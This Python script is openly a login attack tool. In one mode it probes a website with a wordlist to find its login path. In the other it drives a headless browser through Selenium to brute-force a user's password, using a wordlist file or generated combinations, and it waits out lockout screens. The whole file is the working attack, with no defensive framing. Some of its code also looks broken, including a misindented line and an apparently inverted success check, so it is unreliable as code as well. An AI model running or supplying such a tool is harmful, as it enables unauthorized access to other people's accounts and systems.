#!/usr/bin/python3
#!/utf/8in/root_login_attack
#!/ali/elainous

from    threading       import  Thread
from    requests        import  get
from    webbrowser      import  open    as web
from    time            import  time,   sleep
from    bs4             import  BeautifulSoup

class login:
    def __init__(self):
        self.browsers       =   {'1':['Chrome','.'],'2':['Opera','.'],'3':['PhantomJS',None]}
        self.login_url      =   None
        self.urls_attacked  =   []
        self.err_url        =   None
        self.username       =   None
        self.old_passwd     =   None
        self.pass_done      =   False
        self.elements       =   ('name','id','class')
        self.attrs          =   ('text','email','password','button','submit')
        self._stop          =   False
        self._correct       =   False

    def set_driver(self,browser='Firefox',driver='Gecko'):
        ' Run or install the driver '
        # Run the driver.
        print('Starting the "{}" driver... '.format(browser).ljust(40), end='', flush=True)
        exec('from selenium.webdriver import {}'.format(browser))
        self.brwsr = eval(browser)
        if  driver:
            exec('from selenium.webdriver.{}.options import Options'.format(browser.lower()))
            self.dr_options = eval('Options()')
            self.dr_options.set_headless()
            self.dr_options.page_load_strategy = 'eager'
        try:
            self._dr = 'self.dr = self.brwsr({})'.format('options=self.dr_options' if driver else '')
            exec(self._dr)
            return print(' Done')
        except:print('Fail')
        # Install the driver.
        if  driver :
            driver = (browser if  driver=='.' else driver)+'DriverManager'
            exec('from webdriver_manager.{} import {}'.format(browser.lower(),driver))
            driver = eval(driver)
            print('Installing the "{}" driver ...'.format(browser).ljust(40), end='', flush=True)
            try:
                driver().install()
                sleep(5)
                self.dr = self.brwsr(options=self.dr_options)
                return print('Done')
            except:print('Fail')
        exit('error : Can\'t run or install the "{}" driver.'.format(browser))    

    def check_login_url(self,url):
        print(url)
        try:site = get(url)
        except:
            self._stop =  True
            return print(' ** stop  **')
        bs  = BeautifulSoup(site.text,'html5lib')
        if  bs.title == self.err_url or not bs.form or str(bs.form).count('type="password"')!=1:
            return
        self.urls_attacked += [url]

    def get_inputs(self):
        self.dr.get(self.login_url)
        bs = BeautifulSoup(self.dr.page_source,'html5lib')
        if  bs.title == self.err_url or not bs.form or str(bs.form).count('type="password"')!=1:
            return 'notFound'
        inputs = {0:[''], 1:[''], 2:['']}
        for input_tag in bs.form.findAll('input')+bs.form.findAll('button'):
            type_attr =  input_tag.attrs['type']
            if  type_attr not in self.attrs:continue
            for element in self.elements:
                try:
                    attr = input_tag.attrs[element]
                    attr = ('' if type(attr)==str else ' ').join(attr)
                except:continue
                if  type_attr in ('text','email') and not all(inputs[0]):
                    inputs[0] = [input_tag.name,element,attr]
                elif type_attr == 'password' and not all(inputs[1]):
                    inputs[1] = [input_tag.name,element,attr]
                elif type_attr in ('submit','button') and not all(inputs[2]):
                    inputs[2] = [input_tag.name,element,attr]
                else:continue
                break
            if  all([all(v) for v in inputs.values()]):
                self.USERNAME,self.PASSWORD,self.ENTER = inputs.values()
                return 'done'
    
    def set_inputs(self):
        try:
            self.User = self.dr.find_element_by_xpath('//{}[@{}="{}"]'.format(*self.USERNAME))
            self.Pass = self.dr.find_element_by_xpath('//{}[@{}="{}"]'.format(*self.PASSWORD))
            self.Ok   = self.dr.find_element_by_xpath('//{}[@{}="{}"]'.format(*self.ENTER))
            while not all([self.User.is_enabled(), self.Pass.is_enabled(), self.Ok.is_enabled()]):
                print('** LoginBlocked ** please wait...',end='\r') ; sleep(59)
            return True
        except Exception as e:
            print('err: ',e)
            
    def send(self):
        if  self.set_inputs():
            print('\n\n\t+ password : "{}"'.format(self.password))
            return 'done'
        self.User.clear()
        self.User.send_keys(self.username)
        self.Pass.send_keys(self.password)
        print('sending : "{}" & "{}"'.format(self.username,self.password).ljust(100))
        self.Ok.click()
    
    def tab(self,file='t.html'):
        with open(file,'w') as f:f.write(self.dr.page_source)
        sleep(1) ; web(file)

    def wl(self,filename):
        return (key[:-1] for key in open(filename))

    def gwla(self,word,length):
        try:length  = int(length)
        except:length  = 10
        from    itertools   import  product
        for gwl in [product(word,repeat=n) for n in range(1,length+1)]:
            for word in gwl:yield ''.join(word)

    def quit(self):
        print('closing ...')
        sleep(2)
        try:self.dr.quit()
        except:pass

def main():
    global log
    log = login()
    attack_opt =  input('. What are you want ?\n\t 1 - url_attack .\n\t 2 - password_attack .\n> ')
    words_mode =  input('.. words , how ?\n\t 3 - filename .\n\t 4 - generator.\n> ')
    wordlist   =  log.gwla(input('Word : '),input('Length : ')) if words_mode != '3' else log.wl(input('filename : '))
    url  =   input('url : ')
    if  attack_opt == '1' :
        print('Path_attack start ...')
        url  +=   '' if url[-1]=='/' else '/'
        log.err_url = BeautifulSoup(get(url+'ﺎﻠﺒﻠﺒﺒﻠﺒﻠﻟ').text,'html5lib').title
        for word in wordlist:
            sleep(.0123)
            Thread(target=log.check_login_url,args=(url+word,)).start()
            if  log._stop:
                                print('ERR :  your HOST my be not correct or you\'re offline.')
                break
            elif log.urls_attacked:
                break
        else:print('Ooops !!!  cant find the path , Try with another list.')
        sleep(2)
        [print('\n{}\nlogin_path : "{}"\n{}\n'.format('*'*99,url,'*'*99)) for url in log.urls_attacked]
    elif attack_opt == '2' :
        if  'facebook' in url:
            if  input('Hmmm , "fb" is not supported. continue (y/n) ? ').lower()!='y':
                return
        br_opt = input(' 1 - chrome.\n 2 - opera.\n 3 - phantomjs.\n default : firefox.\n -> ')
        log.set_driver(*(log.browsers[br_opt] if  br_opt in ('1','2','3') else []))
        log.login_url = url
        log.err_url   = '403'
        log.username  = input('username : ') if  attack_opt=='2' else ''
        print('Get login...')
        if  log.get_inputs()!='done':
            return print('Error : Something is wrong !!!')
        for log.password in wordlist:
            sleep(.0123)
            if  log.send():
                log.tab()
                return
        else:
            print('Ooops !!! cant find the password , Try with another list.')

if  __name__=='__main__':
    try:main()
    except Exception as err:print(err)
    log.quit()
